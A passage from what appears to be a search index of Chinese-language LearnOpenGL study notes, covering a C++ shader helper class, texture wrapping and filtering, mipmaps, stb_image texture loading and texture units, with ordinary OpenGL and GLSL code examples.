glAttachShader(ID, vertex);\n        glAttachShader(ID, fragment);\n        glLinkProgram(ID);\n        checkCompileErrors(ID, \"PROGRAM\");\n        // delete the shaders as they're linked into our program now and no longer necessary\n        glDeleteShader(vertex);\n        glDeleteShader(fragment);\n    }\n    // activate the shader\n    // ------------------------------------------------------------------------\n    void use()\n    {\n        glUseProgram(ID);\n    }\n    // delete the shader\n    // ------------------------------------------------------------------------\n    void DeleteShader()\n    {\n        glDeleteProgram(ID);\n    }\n\n    // utility uniform functions\n    // ------------------------------------------------------------------------\n    void setBool(const std::string&amp; name, bool value) const\n    {\n        glUniform1i(glGetUniformLocation(ID, name.c_str()), (int)value);\n    }\n    // ------------------------------------------------------------------------\n    void setInt(const std::string&amp; name, int value) const\n    {\n        glUniform1i(glGetUniformLocation(ID, name.c_str()), value);\n    }\n    // ------------------------------------------------------------------------\n    void setFloat(const std::string&amp; name, float value) const\n    {\n        glUniform1f(glGetUniformLocation(ID, name.c_str()), value);\n    }\n    // ------------------------------------------------------------------------\n    void setColor(const std::string&amp; name, float r, float g, float b, float a) const\n    {\n        glUniform4f(glGetUniformLocation(ID, name.c_str()), r, g, b, a);\n    }\n\nprivate:\n    // utility function for checking shader compilation/linking errors.\n    // ------------------------------------------------------------------------\n    void checkCompileErrors(unsigned int shader, std::string type)\n    {\n        int success;\n        char infoLog[1024];\n        if (type != \"PROGRAM\")\n        {\n            glGetShaderiv(shader, GL_COMPILE_STATUS, &amp;success);\n            if (!success)\n            {\n                glGetShaderInfoLog(shader, 1024, NULL, infoLog);\n                std::cout &lt;&lt; \"ERROR::SHADER_COMPILATION_ERROR of type: \" &lt;&lt; type &lt;&lt; \"\\n\" &lt;&lt; infoLog &lt;&lt; \"\\n -- --------------------------------------------------- -- \" &lt;&lt; std::endl;\n            }\n        }\n        else\n        {\n            glGetProgramiv(shader, GL_LINK_STATUS, &amp;success);\n            if (!success)\n            {\n                glGetProgramInfoLog(shader, 1024, NULL, infoLog);\n                std::cout &lt;&lt; \"ERROR::PROGRAM_LINKING_ERROR of type: \" &lt;&lt; type &lt;&lt; \"\\n\" &lt;&lt; infoLog &lt;&lt; \"\\n -- --------------------------------------------------- -- \" &lt;&lt; std::endl;\n            }\n        }\n    }\n};\n#endif\n</code></pre> <p>\u5728\u4e3b\u7a0b\u5e8f\u4e2d\uff0c\u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u521b\u5efa\u7a0b\u5e8f\u5bf9\u8c61\u4ee5\u53ca\u4f7f\u7528\u7740\u8272\u5668\uff1a</p> <pre><code>Shader ShaderProgram(\"shader.vs\", \"shader.fs\");\nShaderProgram.use();\n\nShaderProgram.use();\nShaderProgram.setColor(\"ourColor\", redValue, greenValue, blueValue, 1.0f);\n</code></pre> <p>\u8fd9\u91cc\u6211\u5c06\u9876\u70b9\u7740\u8272\u5668\u548c\u7247\u6bb5\u7740\u8272\u5668\u6e90\u4ee3\u7801\u5206\u522b\u4fdd\u5b58\u5728 <code>shader.vs</code> \u548c <code>shader.fs</code> \u4e2d\uff0c\u5728\u7740\u8272\u5668\u7c7b\u4e2d\u5b9e\u73b0\u8bfb\u53d6\u7f16\u8bd1\u94fe\u63a5\u3002</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_9","title":"\u7eb9\u7406\u6620\u5c04","text":""},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_10","title":"\u7eb9\u7406\u914d\u7f6e\u9009\u9879","text":"<p>1. \u7eb9\u7406\u73af\u7ed5\u65b9\u5f0f</p> <p>\u7eb9\u7406\u5750\u6807\u8303\u56f4\u4e3a <code>(0,0)</code> \u5230 <code>(1,1)</code>\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u5f97\u5230\u7684\u7eb9\u7406\u5750\u6807\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u600e\u4e48\u529e\uff1fOpenGL \u7684\u9ed8\u8ba4\u5904\u7406\u65b9\u5f0f\u662f\u91cd\u590d\u8fd9\u4e2a\u7eb9\u7406\u90e8\u5206\uff0c\u5373 <code>GL_REPEAT</code> \u3002\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>glTexParameteri</code> \u51fd\u6570\u5bf9\u5355\u72ec\u5750\u6807\u8f74\u4fee\u6539\u73af\u7ed5\u65b9\u5f0f\uff0c\u8fbe\u6210\u4e0d\u540c\u7684\u89c6\u89c9\u6548\u679c\uff1a</p> <pre><code>glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_MIRRORED_REPEAT);\nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_MIRRORED_REPEAT);\n</code></pre> <ul> <li>\u53c2\u6570\u4e00\uff1a \u7eb9\u7406\u76ee\u6807\u3002\u4f7f\u7528\u7684\u662f 2D \u7eb9\u7406</li> <li>\u53c2\u6570\u4e8c\uff1a \u914d\u7f6e\u9009\u9879\u3002\u6b64\u5904\u6211\u4eec\u9700\u8981\u914d\u7f6e\u7eb9\u7406\u7684 WRAP \u65b9\u5f0f<ul> <li>\u5728\u7eb9\u7406\u5750\u6807\u4e2d\uff0c\u6a2a\u7740\u7684\u79f0\u4e3a s \u8f74\uff0c\u7ad6\u7740\u7684\u79f0\u4e3a t \u8f74</li> </ul> </li> <li>\u53c2\u6570\u4e09\uff1a \u73af\u7ed5\u65b9\u5f0f\uff0c\u5177\u4f53\u6709\u4ee5\u4e0b\u56db\u79cd\u53ef\u9009\uff1a</li> </ul> <p></p> <p>\u5bf9\u4e8e <code>GL_CLAMP_TO_BORDER</code>\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u8fb9\u7f18\u989c\u8272\uff0c\u4f7f\u7528 <code>glTexParameterfv</code></p> <pre><code>float borderColor[] = { 1.0f, 1.0f, 0.0f, 1.0f };\nglTexParameterfv(GL_TEXTURE_2D, GL_TEXTURE_BORDER_COLOR, borderColor);\n</code></pre> <p>2. \u7eb9\u7406\u8fc7\u6ee4</p> <p>OpenGL \u7684\u9ed8\u8ba4\u8fc7\u6ee4\u65b9\u5f0f\u662f\u90bb\u8fd1\u8fc7\u6ee4 <code>GL_NEAREST</code>\uff0c\u5373\u9009\u62e9\u6700\u63a5\u8fd1\u7eb9\u7406\u5750\u6807\u7684\u90a3\u4e2a\u50cf\u7d20\u7684\u6750\u8d28\u3002\u540c\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u5176\u4fee\u6539\u4e3a <code>GL_LINEAR</code> \u7ebf\u6027\u8fc7\u6ee4\u7684\u65b9\u5f0f\uff0c\u5b83\u4f1a\u6839\u636e\u7eb9\u7406\u5750\u6807\u4e0e\u5468\u56f4\u50cf\u7d20\u4e2d\u5fc3\u7684\u8ddd\u79bb\u505a\u7ebf\u6027\u63d2\u503c\uff0c\u8fd4\u56de\u6df7\u5408\u8272\uff0c\u4ece\u800c\u5b9e\u73b0\u66f4\u52a0\u771f\u5b9e\u7684\u6548\u679c\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u975e\u5e38\u4f4e\u5206\u8fa8\u7387\u7684\u7eb9\u7406\u56fe\uff0c<code>GL_NEAREST</code> \u548c <code>GL_LINEAR</code> \u7684\u6548\u679c\u5982\u56fe\uff1a</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u5bf9\u7eb9\u7406\u88ab\u653e\u5927(Magnify)\u548c\u7f29\u5c0f(Minify)\u65f6\u7684\u4e24\u79cd\u60c5\u51b5\u5206\u522b\u8bbe\u7f6e\u7eb9\u7406\u8fc7\u6ee4\u7684\u9009\u9879\uff0c\u4f8b\u5982\uff0c\u4ee5\u4e0b\u4ee3\u7801\u5b9e\u73b0\u7eb9\u7406\u7f29\u5c0f\u65f6\u4f7f\u7528\u90bb\u8fd1\u8fc7\u6ee4\uff0c\u7eb9\u7406\u653e\u5927\u65f6\u4f7f\u7528\u7ebf\u6027\u8fc7\u6ee4\uff1a</p> <pre><code>glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);\nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n</code></pre> <p>3. \u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406</p> <p>\u5bf9\u4e8e\u8fdc\u5904\u7684\u7269\u4f53\uff0c\u7531\u4e8e\u5176\u4ea7\u751f\u7684\u7247\u6bb5\u53ef\u80fd\u8f83\u5c11\uff0c\u4ece\u9ad8\u5206\u8fa8\u7387\u7eb9\u7406\u4e2d\u4e3a\u8fd9\u4e9b\u7247\u6bb5\u83b7\u53d6\u6b63\u786e\u7684\u989c\u8272\u503c\u8f83\u4e3a\u56f0\u96be\uff0c\u5bfc\u81f4\u5bf9\u8fdc\u5904\u5c0f\u7269\u4f53\u8fdb\u884c\u7684\u7eb9\u7406\u6620\u5c04\u6548\u679c\u4e0d\u771f\u5b9e\u3002</p> <p>OpenGL \u53ef\u4ee5\u4f7f\u7528\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406(Mipmap)\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f53\u6444\u50cf\u673a\u79bb\u7269\u4f53\u8d85\u51fa\u4e00\u5b9a\u8ddd\u79bb\u7684\u9608\u503c\uff0cOpenGL \u4f1a\u4f7f\u7528\u4e0d\u540c\u7ea7\u7684\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u6765\u8fdb\u884c\u7eb9\u7406\u6620\u5c04\u3002\u8fd9\u80fd\u591f\u5728\u4fdd\u6301\u4e86\u6e32\u67d3\u6548\u679c\u7684\u540c\u65f6\u5927\u5927\u63d0\u9ad8\u6027\u80fd\u3002</p> <p>\u6700\u7b80\u5355\u7684 Mipmap \u5c31\u662f\u4e3a\u524d\u4e00\u7ea7\u7eb9\u7406\u56fe\u50cf\u751f\u6210\u4e00\u5f20 \\(\\frac{1}{2}\\times \\frac{1}{2}\\) \u5927\u5c0f\u7684\u65b0\u7eb9\u7406\u56fe\u50cf\uff1a</p> <p></p> <p>\u5728\u6e32\u67d3\u4e2d\u5207\u6362\u591a\u7ea7\u6e10\u53d8\u7eb9\u7406\u7ea7\u522b\u65f6\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u771f\u5b9e\u7684\u751f\u786c\u8fb9\u754c\u3002\u5c31\u50cf\u666e\u901a\u7684\u7eb9\u7406\u8fc7\u6ee4\u4e00\u6837\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4e3a\u7eb9\u7406\u7ea7\u522b\u5207\u6362\u65f6\u4f7f\u7528\u4e0d\u540c\u7684\u8fc7\u6ee4\u65b9\u5f0f\uff1a</p> \u8fc7\u6ee4\u65b9\u5f0f \u63cf\u8ff0 <code>GL_NEAREST_MIPMAP_NEAREST</code> \u4f7f\u7528\u6700\u90bb\u8fd1\u7684\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u7ea7\u522b\uff0c\u5e76\u4f7f\u7528\u90bb\u8fd1\u63d2\u503c\u8fdb\u884c\u7eb9\u7406\u91c7\u6837 <code>GL_LINEAR_MIPMAP_NEAREST</code> \u4f7f\u7528\u6700\u90bb\u8fd1\u7684\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u7ea7\u522b\uff0c\u5e76\u4f7f\u7528\u7ebf\u6027\u63d2\u503c\u8fdb\u884c\u91c7\u6837 <code>GL_NEAREST_MIPMAP_LINEAR</code> \u5728\u4e24\u4e2a\u90bb\u8fd1\u7684\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u4e4b\u95f4\u8fdb\u884c\u7ebf\u6027\u63d2\u503c\uff0c\u4f7f\u7528\u90bb\u8fd1\u63d2\u503c\u8fdb\u884c\u91c7\u6837 <code>GL_LINEAR_MIPMAP_LINEAR</code> \u5728\u4e24\u4e2a\u90bb\u8fd1\u7684\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u4e4b\u95f4\u4f7f\u7528\u7ebf\u6027\u63d2\u503c\uff0c\u5e76\u4f7f\u7528\u7ebf\u6027\u63d2\u503c\u8fdb\u884c\u91c7\u6837 <pre><code>glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n</code></pre> <p>\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u53ea\u6709\u5f53\u7eb9\u7406\u88ab\u7f29\u5c0f\u65f6\u6709\u6548\uff0c\u56e0\u6b64\u5bf9\u4e8e\u653e\u5927\u9009\u9879\u4e0d\u5e94\u8be5\u9009\u62e9\u4e0a\u8ff0\u56db\u79cd\u4e4b\u4e00</p> <p>\u5b9e\u9645\u4e0a\uff0c\u4e3a\u653e\u5927\u8fc7\u6ee4\u9009\u9879\u8bbe\u7f6e\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u8bbe\u7f6e\u4f1a\u4ea7\u751f\u4e00\u4e2a <code>GL_INVALID_ENUM</code> \u9519\u8bef\u4ee3\u7801\u3002</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_11","title":"\u52a0\u8f7d\u548c\u521b\u5efa\u7eb9\u7406","text":"<p><code>stb_image.h</code> \u662fSean Barrett\u7684\u4e00\u4e2a\u975e\u5e38\u6d41\u884c\u7684\u5355\u5934\u6587\u4ef6\u56fe\u50cf\u52a0\u8f7d\u5e93\uff0c\u5b83\u80fd\u591f\u52a0\u8f7d\u5927\u90e8\u5206\u6d41\u884c\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5e76\u4e14\u80fd\u591f\u5f88\u7b80\u5355\u5730\u6574\u5408\u5230\u4f60\u7684\u5de5\u7a0b\u4e4b\u4e2d\u3002</p> <p>\u4e0b\u9762\u7684\u6559\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u5f20\u6728\u7bb1\u7684\u56fe\u7247\u3002\u8981\u4f7f\u7528 <code>stb_image.h</code> \u52a0\u8f7d\u56fe\u7247\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5b83\u7684 <code>stbi_load</code> \u51fd\u6570\uff1a</p> <pre><code>int width, height, nrChannels;\nunsigned char *data = stbi_load(\"container.jpg\", &amp;width, &amp;height, &amp;nrChannels, 0);\n</code></pre> <p>\u8fd9\u4e2a\u51fd\u6570\u9996\u5148\u63a5\u53d7\u4e00\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684\u4f4d\u7f6e\u4f5c\u4e3a\u8f93\u5165\u3002\u63a5\u4e0b\u6765\u5b83\u9700\u8981\u4e09\u4e2a <code>int</code> \u4f5c\u4e3a\u5b83\u7684\u7b2c\u4e8c\u3001\u7b2c\u4e09\u548c\u7b2c\u56db\u4e2a\u53c2\u6570\uff0c<code>stb_image.h</code> \u5c06\u4f1a\u7528\u56fe\u50cf\u7684\u5bbd\u5ea6\u3001\u9ad8\u5ea6\u548c\u989c\u8272\u901a\u9053\u7684\u4e2a\u6570\u586b\u5145\u8fd9\u4e09\u4e2a\u53d8\u91cf\uff0c\u8fd9\u4e9b\u53c2\u6570\u5728\u4e4b\u540e\u751f\u6210\u7eb9\u7406\u65f6\u4f1a\u88ab\u7528\u5230\u3002</p> <pre><code>// \u751f\u6210\u7eb9\u7406\u5bf9\u8c61\nunsigned int texture;\nglGenTextures(1, &amp;texture);\n\n// \u7ed1\u5b9a\u7eb9\u7406\nglBindTexture(GL_TEXTURE_2D, texture);\n\n// \u4f7f\u7528\u524d\u9762\u8f7d\u5165\u7684\u56fe\u7247\u6570\u636e\u751f\u6210\u7eb9\u7406\nglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, data);\nglGenerateMipmap(GL_TEXTURE_2D);\n</code></pre> <ul> <li>\u53c2\u6570\u4e00\uff1a \u7eb9\u7406\u76ee\u6807</li> <li>\u53c2\u6570\u4e8c\uff1a \u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u7684\u7ea7\u522b\u30020 \u5bf9\u5e94 base-level</li> <li>\u53c2\u6570\u4e09\uff1a \u7eb9\u7406\u5b58\u50a8\u540e\u7684\u683c\u5f0f\u3002\u7531\u4e8e\u6b64\u5904\u53ea\u9700\u8981 RGB \u503c\uff0c\u56e0\u6b64\u8bbe\u7f6e\u4e3a <code>GL_RGB</code></li> <li>\u53c2\u6570\u56db\u3001\u4e94\uff1a \u7eb9\u7406\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6</li> <li>\u53c2\u6570\u516d\uff1a \u603b\u4e3a 0\uff0c\u5386\u53f2\u9057\u7559\u95ee\u9898</li> <li>\u53c2\u6570\u4e03\u3001\u516b\uff1a \u539f\u56fe\u7684\u683c\u5f0f\u548c\u6570\u636e\u7c7b\u578b\u3002\u6b64\u5904\u6211\u4eec\u4ee5 RGB \u52a0\u8f7d\u56fe\u50cf\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u4e3a char(Byte) \u6570\u7ec4</li> <li>\u53c2\u6570\u4e5d\uff1a \u56fe\u50cf\u6570\u636e</li> </ul> <p>\u5f53\u8c03\u7528 <code>glTexImage2D</code> \u540e\uff0c\u53ea\u6709 base level \u7ea7\u522b\u7684\u7eb9\u7406\u56fe\u50cf\u88ab\u52a0\u8f7d\u3002\u5982\u679c\u8981\u4f7f\u7528\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\uff0c\u53ef\u4ee5\u518d\u540e\u9762\u52a0\u4e00\u53e5 <code>glGenerateMipmap</code>\uff0c\u5b83\u4f1a\u4e3a\u53c2\u6570\u5bf9\u5e94\u7ed1\u5b9a\u7684\u7eb9\u7406\u751f\u6210\u6240\u9700\u8981\u7684\u591a\u7ea7\u6e10\u8fdc\u7eb9\u7406\u3002</p> <p>\u6700\u7ec8\uff0c\u751f\u6210\u4e00\u4e2a\u7eb9\u7406\u7684\u8fc7\u7a0b\u53ef\u4ee5\u7b80\u5316\u4e3a\uff1a</p> <pre><code>unsigned int texture;\nglGenTextures(1, &amp;texture);\nglBindTexture(GL_TEXTURE_2D, texture);\n// \u4e3a\u5f53\u524d\u7ed1\u5b9a\u7684\u7eb9\u7406\u5bf9\u8c61\u8bbe\u7f6e\u73af\u7ed5\u3001\u8fc7\u6ee4\u65b9\u5f0f\nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);   \nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\nglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n// \u52a0\u8f7d\u5e76\u751f\u6210\u7eb9\u7406\nint width, height, nrChannels;\nstbi_set_flip_vertically_on_load(true); // \u5782\u76f4\u7ffb\u8f6c\nunsigned char *data = stbi_load(\"container.jpg\", &amp;width, &amp;height, &amp;nrChannels, 0);\nif (data)\n{\n    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, data);\n    glGenerateMipmap(GL_TEXTURE_2D);\n}\nelse\n{\n    std::cout &lt;&lt; \"Failed to load texture\" &lt;&lt; std::endl;\n}\n// \u91ca\u653e\u56fe\u50cf\u6570\u636e\nstbi_image_free(data);\n</code></pre> <p>OpenGL\u9ed8\u8ba4\u5ffd\u7565\u900f\u660e\u5ea6 alpha \u53c2\u6570\uff0c\u5982\u679c\u5e0c\u671b\u6e32\u67d3\u900f\u660e\u7269\u4f53\uff0c\u8bf7\u52a0\u4e0a</p> <pre><code>glEnable(GL_BLEND); // \u542f\u7528\u6df7\u5408\nglBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA); // \u6df7\u5408\u51fd\u6570\n</code></pre> <p>\u5728\u672c\u4f8b\u4e2d\uff0c\u6211\u4eec\u6784\u9020\u7684\u9876\u70b9\u6570\u636e\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>// \u4e09\u89d2\u5f62\u9876\u70b9\u6570\u636e\nfloat vertices[] = {\n        //     ---- \u4f4d\u7f6e ----       ---- \u989c\u8272 ----     - \u7eb9\u7406\u5750\u6807 -\n         0.5f,  0.5f, 0.0f,   1.0f, 0.0f, 0.0f,   1.0f, 1.0f,   // \u53f3\u4e0a\n         0.5f, -0.5f, 0.0f,   0.0f, 1.0f, 0.0f,   1.0f, 0.0f,   // \u53f3\u4e0b\n        -0.5f, -0.5f, 0.0f,   0.0f, 0.0f, 1.0f,   0.0f, 0.0f,   // \u5de6\u4e0b\n        -0.5f,  0.5f, 0.0f,   1.0f, 1.0f, 0.0f,   0.0f, 1.0f    // \u5de6\u4e0a\n};\n\nunsigned int indices[] = {\n    0, 1, 3, // \u7b2c\u4e00\u4e2a\u4e09\u89d2\u5f62\n    1, 2, 3  // \u7b2c\u4e8c\u4e2a\u4e09\u89d2\u5f62\n};\n</code></pre> <p>\u5bf9\u5e94\u9876\u70b9\u5c5e\u6027\u6307\u9488\u7684\u8bbe\u7f6e\u5982\u4e0b\uff1a</p> <pre><code>// position attribute\nglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(float), (void*)0);\nglEnableVertexAttribArray(0);\n// color attribute\nglVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(float), (void*)(3 * sizeof(float)));\nglEnableVertexAttribArray(1);\n// texture coord attribute\nglVertexAttribPointer(2, 2, GL_FLOAT, GL_FALSE, 8 * sizeof(float), (void*)(6 * sizeof(float)));\nglEnableVertexAttribArray(2);\n</code></pre> <p>\u4f7f\u7528\u7684\u9876\u70b9\u7740\u8272\u5668\u548c\u7247\u6bb5\u7740\u8272\u5668\u6e90\u7801\u4e3a\uff1a</p> <pre><code>// shader.vs\n#version 330 core\n\nlayout (location = 0) in vec3 aPos;\nlayout (location = 1) in vec3 aColor;\nlayout (location = 2) in vec2 aTexCoord;\n\nout vec3 ourColor;\nout vec2 TexCoord;\n\nvoid main()\n{\n    gl_Position = vec4(aPos, 1.0);\n    ourColor = aColor;\n    TexCoord = aTexCoord;\n}\n\n// ------------------------------------------\n\n// shader.fs\n#version 330 core\nout vec4 FragColor;\n\nin vec3 ourColor;\nin vec2 TexCoord;\n\nuniform sampler2D ourTexture;\n\nvoid main()\n{\n    FragColor = texture(ourTexture, TexCoord);\n}\n</code></pre>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_12","title":"\u7eb9\u7406\u5355\u5143","text":"<p>\u5728\u4e0a\u9762\u7684\u7247\u6bb5\u7740\u8272\u5668\u4e2d\uff0c\u6211\u4eec\u5c06 Texture \u53d8\u91cf\u5b9a\u4e49\u4e3a uniform \u5c5e\u6027\uff0c\u4f46\u662f\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u5bf9\u5176\u8fdb\u884c\u8d4b\u503c\u4fee\u6539\u7b49\u64cd\u4f5c\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\u5b83\u7684\u9ed8\u8ba4\u503c\u662f 0\uff0c\u800c\u7eb9\u7406\u5355\u51430\u662f\u9ed8\u8ba4\u6fc0\u6d3b\u7684\u7eb9\u7406\u5355\u5143\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\u3002</p> <p>\u4f46\u662f\u5982\u679c\u6211\u4eec\u5e0c\u671b\u6df7\u5408\u4e24\u4e2a\u751a\u81f3\u66f4\u591a\u4e2a\u7eb9\u7406\u600e\u4e48\u529e\u5462\uff1fOpenGL \u4fdd\u8bc1\u81f3\u5c11\u6709 16 \u4e2a\u7eb9\u7406\u5355\u5143\u53ef\u4ee5\u4f7f\u7528\uff0c\u5373\u8303\u56f4\u662f <code>GL_TEXTURE0</code> \u5230 <code>GL_TEXTURE15</code>\u3002\u5f53\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u6216\u6620\u5c04\u67d0\u4e00\u7eb9\u7406\u5355\u5143\u5bf9\u5e94\u7684\u7eb9\u7406\u65f6\uff0c\u53ea\u9700\u8981\u5728 Bind \u524d\u4f7f\u7528 <code>glActiveTexture</code> \u51fd\u6570\u5c06\u5176\u6fc0\u6d3b\u5373\u53ef\uff1a</p> <pre><code>glActiveTexture(GL_TEXTURE0); // \u5728\u7ed1\u5b9a\u7eb9\u7406\u4e4b\u524d\u5148\u6fc0\u6d3b\u7eb9\u7406\u5355\u5143\nglBindTexture(GL_TEXTURE_2D, texture);\n</code></pre> <p>\u5728\u5faa\u73af\u5904\u7406\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u4f7f\u7528 <code>GL_TEXTURE0 + 8</code> \u4ee3\u66ff <code>GL_TEXTURE8</code></p> <p>\u5047\u5b9a\u6211\u4eec\u7684\u7247\u6bb5\u7740\u8272\u5668\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>#version 330 core\n...\n\nuniform sampler2D texture1;\nuniform sampler2D texture2;\n\nvoid main()\n{\n    FragColor = mix(texture(texture1, TexCoord), texture(texture2, TexCoord), 0.2);\n}\n</code></pre> <p><code>mix</code> \u662f GLSL \u7684\u5185\u7f6e\u51fd\u6570\uff0c\u53c2\u6570 0.2 \u8bf4\u660e\u8fd4\u56de 80% \u7b2c\u4e00\u4e2a\u8f93\u5165\u989c\u8272\u548c 20% \u7b2c\u4e8c\u4e2a\u8f93\u5165\u989c\u8272\u7684\u6df7\u5408</p> <p>\u6309\u7167\u5148\u524d\u6b65\u9aa4\uff0c\u6211\u4eec\u5728\u4e3b\u7a0b\u5e8f\u4e2d\u8bbe\u7f6e\u5e76\u52a0\u8f7d\u4e24\u4e2a texture ID\uff1a</p> <pre><code>unsigned int texture1, texture2;\n\n    // ..:: \u7eb9\u7406\u6570\u636e\u52a0\u8f7d :: ..\n    // ------------------------------------------------------------\n    // 1. \u7ed1\u5b9a\u7eb9\u7406\u5bf9\u8c61\n    glBindTexture(GL_TEXTURE_2D, texture1);\n    // 2. \u8bbe\u7f6e\u7eb9\u7406\u73af\u7ed5\u3001\u8fc7\u6ee4\u65b9\u5f0f\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    // 3. \u52a0\u8f7d\u5e76\u751f\u6210\u7eb9\u7406\n    int width, height, nrChannels;\n    stbi_set_flip_vertically_on_load(true); // \u8ba9\u7eb9\u7406\u5750\u6807 y \u8f74\u7ffb\u8f6c\n    unsigned char* data = stbi_load(\"graph1.jpg\", &amp;width, &amp;height, &amp;nrChannels, 0);\n    if (data)\n    {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, data);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    }\n    else std::cout &lt;&lt; \"Failed to load texture\" &lt;&lt; std::endl;\n    stbi_image_free(data);\n\n    // ..:: \u7eb9\u7406\u6570\u636e\u52a0\u8f7d :: ..\n    // ------------------------------------------------------------\n    // 1. \u7ed1\u5b9a\u7eb9\u7406\u5bf9\u8c61\n    glBindTexture(GL_TEXTURE_2D, texture2);\n    // 2. \u8bbe\u7f6e\u7eb9\u7406\u73af\u7ed5\u3001\u8fc7\u6ee4\u65b9\u5f0f\n    [ ... ]\n    // 3. \u52a0\u8f7d\u5e76\u751f\u6210\u7eb9\u7406\n    [ ... ]\n</code></pre> <p>\u4f46\u662f\u6b64\u65f6\u7740\u8272\u5668\u4e2d uniform \u7684 <code>texture1</code> \u548c <code>texture2</code> \u90fd\u672a\u8d4b\u503c\uff0c\u9ed8\u8ba4\u6307\u5411\u7eb9\u7406\u5355\u51430\uff0c\u6211\u4eec\u5e0c\u671b <code>texture2</code> \u6307\u5411\u7eb9\u7406\u5355\u51431\uff0c\u6b64\u5904\u5e94\u4f7f\u7528 <code>glUniform1i</code> \u51fd\u6570\u5c06\u5176\u503c\u8bbe\u7f6e\u4e3a1\u3002\u8fd9\u4e4b\u540e\u5c31\u53ef\u4ee5\u6fc0\u6d3b\u5404\u4e2a\u7eb9\u7406\u5355\u5143\u5e76\u6e32\u67d3\u56fe\u5f62\uff1a</p> <pre><code>ourShader.use(); // \u4e0d\u8981\u5fd8\u8bb0\u5728\u8bbe\u7f6euniform\u53d8\u91cf\u4e4b\u524d\u6fc0\u6d3b\u7740\u8272\u5668\u7a0b\u5e8f\uff01\nglUniform1i(glGetUniformLocation(ourShader.ID, \"texture1\"), 0); // \u624b\u52a8\u8bbe\u7f6e\nourShader.setInt(\"texture2\", 1); // \u6216\u8005\u4f7f\u7528\u7740\u8272\u5668\u7c7b\u8bbe\u7f6e\n\nwhile(...) \n{\n    [...]\n    glActiveTexture(GL_TEXTURE0);\n    glBindTexture(GL_TEXTURE_2D, texture1);\n    glActiveTexture(GL_TEXTURE1);\n    glBindTexture(GL_TEXTURE_2D, texture2);\n\n    ourShader.use();\n    glBindVertexArray(VAO);\n    